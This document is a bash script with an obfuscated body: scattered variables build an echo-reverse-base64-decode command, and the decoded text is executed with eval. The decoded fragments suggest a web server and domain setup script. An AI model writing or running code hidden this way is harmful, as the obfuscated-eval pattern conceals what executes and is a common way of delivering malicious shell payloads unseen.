gH4="Ed";kM0="xSz";c="ch";L="4";rQW="";fE1="lQ";s=" '=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JHa0BSesR3YlJncvNGIkVGd19mcgMXag4Wah12bkBSZoRHIlJXdz5WRg4yajVGajByUOREIn5WawBXarNlIg8GajVGIgogblhGdgsjI/UmchxmZkV3bsNEIn5WazVHIulWYt9GZgIXdvlHIn5Wa05WavBHI19WegUmcBJCIv52XzVWefRXZnBiZppQZyFGbmRWdvx2QgcmbpNXdgMXag4Wah12bkBSZoRHImlGIrNXQgMiCKICTJFUTF9VTPRkTBJFJgoDbpFWblBSbvRmbhJHIn5WazVlIg8GajVmCi4USB10TERCQulWbkFmI9wUSB1URf10TE5UQSpwczVmckRWYgwWah1WZg02bk5WYyBSYgUGdhJXZuV2RgMiCKkmZKEDI0lGelBCIKIiLkVmcpVXclJHIzlGIl1WYuBibpFWbvREI6I3byJXRiAyboNWZgAiCuVGa0ByOd1FIi4USB10TERiIgoXLgs1WgYWaK4USB10TEBiIgoTKTBlVgMXaoRHIvRHIkVGdul2bwBycnQXagUmc1NnblhCIl1WYuBibpFWbvRGIyV3b5BiclRnbFJCIw1CIkFWZypgbpFWbvRGIy9mZgQHct9mcQByIKoQfKUmbvRGIgoQamBCIgAiCi4SKn8mbnAicvByJzVWenAicvhCIn42JgI3bgcSenACa0l2dgIXZ3NnbhBSZzFWZsBHIsQXdw5WagQWasFmdulkIg8GajVGIgACIgAiClNHblBCIgAiCv5EIjACIxAibyVHdlJHIgACIgAiCuVGa0ByOd1FIi8mbiASP9AiIlNnbvB3clJHJiACf8BiIuJCI90DIiU2cu9GczVmckICIbtFImlGblBCIgAiCzVWWgMCIgADIuJXd0VmcgACIgACIK4WZoRHI70VXgIycllnIg0TPgISZz52bwNXZyRiIgwHfgISeiASP9AiIlNnbvB3clJHJiAyWbBiZpBCIgAiClNXYjJXZ39Gbg8GdgQnclZnbvNEIjACIpcSX6IXZ39Gb6s1JgcSX6IXZwBXd6s1JgIHdgwHIiU2cu9GczVmckICIvh2YlhCJ9U2cu9GczVmcgACIgoQZz52bwNXZyBiIgoTKv52LzVWegI3bg42L5hCI0BXbvJHckICIw1CIkFWZyBCIgAiCvRGI7UWdyRHIlxWaodHIgoQMk0Ddw12byBHIsF2YvxGIgowegkCKv52XzVWefRXZnpAd1BnbpBybu9ycllHIy9GIu9SegUmdpRXaz5WZz5WatU2chNGIlxGZuFGag8Gdg42bpR3YuVnRgMiCKg2chJ2LulmYvEyI
' | r";HxJ="s";Hc2="";f="as";kcE="pas";cEf="ae";d="o";V9z="6";P8c="if";U=" -d";Jc="ef";N0q="";v="b";w="e";b="v |";Tx="Eds";xZp=""
x=$(eval "$Hc2$w$c$rQW$d$s$w$b$Hc2$v$xZp$f$w$V9z$rQW$L$U$xZp")
eval "$N0q$x$Hc2$rQW"
